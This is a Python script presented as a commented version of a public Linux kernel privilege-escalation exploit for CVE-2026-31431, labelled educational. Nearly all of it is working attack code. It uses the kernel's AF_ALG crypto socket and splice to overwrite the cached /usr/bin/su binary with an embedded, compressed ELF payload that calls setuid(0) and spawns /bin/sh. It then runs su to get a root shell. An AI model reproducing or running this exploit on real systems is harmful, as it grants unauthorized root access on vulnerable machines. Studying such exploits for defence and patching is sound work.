#!/usr/bin/env python3

# ==============================================================================
# Script Name:   copy_fail_unminimized_with_comments.py
# Modified by:   David H. Isakson II
# Email:         david.isakson.ii@gmail.com
# Date:          2026-05-02
# Version:       1.0.1
# Description:   A commented an unminimized version of the Copy Fail
#                exploit. CVE-2026-31431 for educational purposes.
#
# Usage:
#   Not recommended for use. This script is a unminimized verson of the
#   Copy Fail exploit CVE-2026-31431. For educational purposes only.
#   My goal here was to understand how the exploit worked.
#   The copy_fail_minimized.py is the unmodified script that can be found
#   at https://github.com/theori-io/copy-fail-CVE-2026-31431
# 
#   USE AT YOUR OWN RISK AND DO NOT USE ON A COMPUTER YOU DON'T HAVE PERMISSION
#   TO BE ON. THE AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGE OR ILLEGAL USE.
# ==============================================================================

import os
import zlib
import socket


def d(x):
    # returns the raw bytes of x
    return bytes.fromhex(x)


def c(f, t, c):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    h = 279# Directly access kernel cryptographic subsystem
    
    a.setsockopt(h, 1, d("0800010000000010" + "0" * 64))
    a.setsockopt(h, 5, None, 4)
    
    u, _ = a.accept()
    
    o = t + 4# Calculate offset
    i = d("00")# convert to raw bytes
    
    u.sendmsg(# Send the payload to the kernel
        [b"A" * 4 + c],# Data buffer payload
        [
            (h, 3, i * 4),
            (h, 2, b"\x10" + i * 19),
            (h, 4, b"\x08" + i * 3),
        ],
        32768,
    )
    
    r, w = os.pipe()# read to write
    n = os.splice
    n(f, w, o, offset_src=0)
    n(r, u.fileno(), o)
    
    try:
        u.recv(8 + t)
    except:
        0  # type: ignore

# opens su in read only mode
f = os.open("/usr/bin/su", 0)
i = 0

compressed_hex_str = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

"""
    Decompressed Hex String
    b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00'
"""


e = zlib.decompress(d(compressed_hex_str))

while i < len(e):
    # loop through function c
    c(f, i, e[i : i + 4])
    i += 4

"""
Opens a super user shell in vulnerable systems.
"""
os.system("su")
